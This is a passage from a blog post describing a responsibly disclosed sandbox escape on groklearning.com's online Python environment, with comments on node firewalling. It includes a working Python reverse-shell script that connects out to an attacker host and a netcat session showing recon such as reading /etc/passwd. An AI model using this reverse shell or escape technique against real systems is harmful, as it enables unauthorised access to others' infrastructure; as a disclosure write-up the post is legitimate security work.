<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">p <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">subprocess</span>.<span style="color: black;">Popen</span><span style="color: black;">&#40;</span><span style="color: black;">&#91;</span><span style="color: #483d8b;">'/bin/bash'</span><span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'-c'</span><span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'ulimit -a'</span><span style="color: black;">&#93;</span><span style="color: #66cc66;">,</span> stdout<span style="color: #66cc66;">=</span><span style="color: #dc143c;">subprocess</span>.<span style="color: black;">PIPE</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span>p.<span style="color: black;">stdout</span>.<span style="color: black;">read</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
</ol></div></div>

<p>The result I got was this:</p>

<div class="geshifilter"><div class="text geshifilter-text" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">core file size &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(blocks, -c) 0</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">data seg size &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (kbytes, -d) unlimited</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">scheduling priority &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (-e) 0</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">file size &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (blocks, -f) unlimited</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">pending signals &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (-i) 13371</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">max locked memory &nbsp; &nbsp; &nbsp; (kbytes, -l) 64</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">max memory size &nbsp; &nbsp; &nbsp; &nbsp; (kbytes, -m) unlimited</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">open files &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(-n) 1024</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">pipe size &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(512 bytes, -p) 8</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">POSIX message queues &nbsp; &nbsp; (bytes, -q) 819200</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">real-time priority &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(-r) 0</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">stack size &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(kbytes, -s) 8192</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">cpu time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (seconds, -t) 3</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">max user processes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(-u) 3</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">virtual memory &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(kbytes, -v) 102400</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">file locks &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(-x) unlimited</div></li>
</ol></div></div>

<p>As you could see from the above output we were limited to just 3 users processes... Apparently, I wasn't going to get my shell so easily so I had to think up something else...</p>

<h2>Launching the second attack</h2>

<p>It was time to launch a second attack, but this time using <code>os.execv()</code> instead of <code>subprocess.call()</code></p>

<p>So, I've started my netcat listener again, and then used this script for my reverse shell:</p>

<div class="geshifilter"><div class="python geshifilter-python" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">socket</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">os</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">socket</span>.<span style="color: #dc143c;">socket</span><span style="color: black;">&#40;</span><span style="color: #dc143c;">socket</span>.<span style="color: black;">AF_INET</span><span style="color: #66cc66;">,</span> <span style="color: #dc143c;">socket</span>.<span style="color: black;">SOCK_STREAM</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s.<span style="color: black;">connect</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">'x.x.x.x'</span><span style="color: #66cc66;">,</span> <span style="color: #ff4500;">80</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #dc143c;">os</span>.<span style="color: black;">dup2</span><span style="color: black;">&#40;</span>s.<span style="color: black;">fileno</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span><span style="color: #ff4500;">0</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #dc143c;">os</span>.<span style="color: black;">dup2</span><span style="color: black;">&#40;</span>s.<span style="color: black;">fileno</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span><span style="color: #ff4500;">1</span><span style="color: black;">&#41;</span> </div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #dc143c;">os</span>.<span style="color: black;">dup2</span><span style="color: black;">&#40;</span>s.<span style="color: black;">fileno</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span><span style="color: #ff4500;">2</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #dc143c;">os</span>.<span style="color: black;">execv</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">'/bin/sh'</span><span style="color: #66cc66;">,</span> <span style="color: black;">&#91;</span><span style="color: #483d8b;">'-i'</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span></div></li>
</ol></div></div>

<p>The result this time was this:</p>

<div class="geshifilter"><div class="text geshifilter-text" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"># nc -l 80 </div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">pwd</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">/tmp/tmpEMZgWN</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">ls -la </div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">total 4</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">drwx------ 3 39540956 1002 &nbsp; &nbsp;0 Mar &nbsp;4 18:22 .</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">drwx--x--x 4 &nbsp; &nbsp; 1001 root 4096 Mar &nbsp;4 18:22 ..</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">-rw------- 1 39540956 1002 &nbsp;263 Mar &nbsp;4 18:22 program.py</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">uname -a </div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Linux prod-terminal00-eu-west-1 3.8.0-35-generic #50-Ubuntu SMP Tue Dec 3 01:24:59 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">cat /etc/passwd</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">root:x:0:0:root:/root:/bin/bash</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">bin:x:2:2:bin:/bin:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">sys:x:3:3:sys:/dev:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">sync:x:4:65534:sync:/bin:/bin/sync</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">games:x:5:60:games:/usr/games:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">man:x:6:12:man:/var/cache/man:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">mail:x:8:8:mail:/var/mail:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">news:x:9:9:news:/var/spool/news:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">proxy:x:13:13:proxy:/bin:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">www-data:x:33:33:www-data:/var/www:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">backup:x:34:34:backup:/var/backups:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">cat /etc/issue</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Ubuntu 12.10 \n \l</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">whereis vi </div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">vi:</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">cat &gt; hello.txt &lt;&lt;__EOF__</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Hi, there!</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">__EOF__</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">cat hello.txt</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Hi, there!</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">ls -la</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">total 4</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">drwx------ 4 39540956 1002 &nbsp; &nbsp;0 Mar &nbsp;4 18:22 .</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">drwx--x--x 4 &nbsp; &nbsp; 1001 root 4096 Mar &nbsp;4 18:23 ..</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">-rw------- 1 39540956 1002 &nbsp; 11 Mar &nbsp;4 18:23 hello.txt</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">-rw------- 1 39540956 1002 &nbsp;263 Mar &nbsp;4 18:22 program.py</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">cat program.py</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"># Enter your code for &quot;Interacting with Eliza&quot; here.</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">import socket</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">import os</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s.connect(('x.x.x.x', 80))</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">os.dup2(s.fileno(),0)</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">os.dup2(s.fileno(),1) </div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">os.dup2(s.fileno(),2)</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">os.execv('/bin/sh', ['-i'])</div></li>
</ol></div></div>

<p>This time I managed to get my reserve shell and get access to the system running the groklearning.com Python code.</p>

<p>At this point I stopped and decided it was time to let the Security Team at groklearning.com know about the security issue.</p>

<h2>Fixing the issue</h2>

<p>Soon after I managed to get shell access to the system I mailed the Security Team at groklearning.com about this issue.</p>

<p>After sending the mail soon enough one of the guys from Security Team at groklearning.com contacted me and we had a conversation about the issue in order to further identify the root cause. A bit later the security issue was fixed and creating a reverse shell was no longer possible.</p>

<p>Now, we can all be a bit happier that <a href="https://groklearning.com/">groklearning.com</a> is a bit safer than before with patching that security issue and continues to serve it's mission to educate people! :)</p>
</div></div></div><div class="field field-name-field-tags field-type-taxonomy-term-reference field-label-above clearfix"><h3 class="field-label">Tags: </h3><ul class="links"><li class="taxonomy-term-reference-0" rel="dc:subject"><a href="/taxonomy/term/2" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="">BSD</a></li><li class="taxonomy-term-reference-1" rel="dc:subject"><a href="/taxonomy/term/1" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="">GNU/Linux</a></li><li class="taxonomy-term-reference-2" rel="dc:subject"><a href="/taxonomy/term/11" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="">Python</a></li></ul></div>  </div>

      <div class="link-wrapper">
      <ul class="links inline"><li class="comment_forbidden first last"><span><a href="/user/login?destination=node/109%23comment-form">Log in</a> or <a href="/user/register?destination=node/109%23comment-form">register</a> to post comments</span></li>
</ul>    </div>
  
  <div id="comments" class="comment-wrapper">
          <h2 class="title">Comments</h2>
      
  <a id="comment-2"></a>
<div class="comment clearfix" about="/comment/2#comment-2" typeof="sioc:Post sioct:Comment">

  <div class="attribution">

    
    <div class="submitted">
      <p class="commenter-name">
        <span rel="sioc:has_creator"><span class="username" xml:lang="" about="/user/4731" typeof="sioc:UserAccount" property="foaf:name" datatype="">auscompgeek</span></span>      </p>
      <p class="comment-time">
        <span property="dc:date dc:created" content="2014-05-02T07:28:17+03:00" datatype="xsd:dateTime">Fri, 05/02/2014 - 07:28</span>      </p>
      <p class="comment-permalink">
        <a href="/comment/2#comment-2" class="permalink" rel="bookmark">Permalink</a>      </p>
    </div>
  </div>

  <div class="comment-text">
    <div class="comment-arrow"></div>

    
        <h3 property="dc:title" datatype=""><a href="/comment/2#comment-2" class="permalink" rel="bookmark">wait, what?</a></h3>
    
    <div class="content">
      <span rel="sioc:reply_of" resource="/node/109" class="rdf-meta"></span><div class="field field-name-comment-body field-type-text-long field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><p>My understanding was that the sandbox was firewalled such that outbound internet access was blocked after <a href="http://www.cyphar.com/security">cyphar</a> found that he had outbound internet access last year.</p>
</div></div></div>          </div> <!-- /.content -->

    <ul class="links inline"><li class="comment_forbidden first last"><span><a href="/user/login?destination=node/109%23comment-form">Log in</a> or <a href="/user/register?destination=node/109%23comment-form">register</a> to post comments</span></li>
</ul>  </div> <!-- /.comment-text -->
</div>

<div class="indented"><a id="comment-3"></a>
<div class="comment comment-by-node-author clearfix" about="/comment/3#comment-3" typeof="sioc:Post sioct:Comment">

  <div class="attribution">

    
    <div class="submitted">
      <p class="commenter-name">
        <span rel="sioc:has_creator"><span class="username" xml:lang="" about="/user/1" typeof="sioc:UserAccount" property="foaf:name" datatype="">dnaeon</span></span>      </p>
      <p class="comment-time">
        <span property="dc:date dc:created" content="2014-05-02T15:02:41+03:00" datatype="xsd:dateTime">Fri, 05/02/2014 - 15:02</span>      </p>
      <p class="comment-permalink">
        <a href="/comment/3#comment-3" class="permalink" rel="bookmark">Permalink</a>      </p>
    </div>
  </div>

  <div class="comment-text">
    <div class="comment-arrow"></div>

    
        <h3 property="dc:title" datatype=""><a href="/comment/3#comment-3" class="permalink" rel="bookmark">Hi,</a></h3>
    
    <div class="content">
      <span rel="sioc:reply_of" resource="/node/109" class="rdf-meta"></span><span rel="sioc:reply_of" resource="/comment/2#comment-2" class="rdf-meta"></span><div class="field field-name-comment-body field-type-text-long field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><p>Hi,</p>

<p>When connecting to the groklearning.com sandbox you are actually forwarded to different nodes based on your location.</p>

<p>So, in my case these were nodes in Europe, which were not firewalled and there outbound access was allowed, which is what was needed in order to launch the attack.</p>

<p>In other words - not all nodes were firewalled :)</p>

<p>Thanks for the link to <code>cyphar</code>, I wasn't aware that this has been exploited already :)</p>
</div></div></div>          </div> <!-- /.content -->

    <ul class="links inline"><li class="comment_forbidden first last"><span><a href="/user/login?destination=node/109%23comment-form">Log in</a> or <a href="/user/register?destination=node/109%23comment-form">register</a> to post comments</span></li>
</ul>  </div> <!-- /.comment-text -->
</div>
</div>
  </div>

</div>
  </div>
</div>
  </div>
      
    </div></div> <!-- /.section, /#content -->

    
  </div></div> <!-- /#main, /#main-wrapper -->

  
  <div id="footer-wrapper"><div class="section">

    
          <div id="footer" class="clearfix">
          <div class="region region-footer">
    <div id="block-system-powered-by" class="block block-system">

    
  <div class="content">
    <span>Powered by <a href="http://drupal.org">Drupal</a></span>&nbsp; | &nbsp;<a href="http://www.oneall.com/services/">Social Login</a> powered by <a href="http://www.oneall.com/">OneAll</a>  </div>
</div>
  </div>
      </div> <!-- /#footer -->
    
  </div></div> <!-- /.section, /#footer-wrapper -->

</div></div> <!-- /#page, /#page-wrapper -->
  </body>
</html>
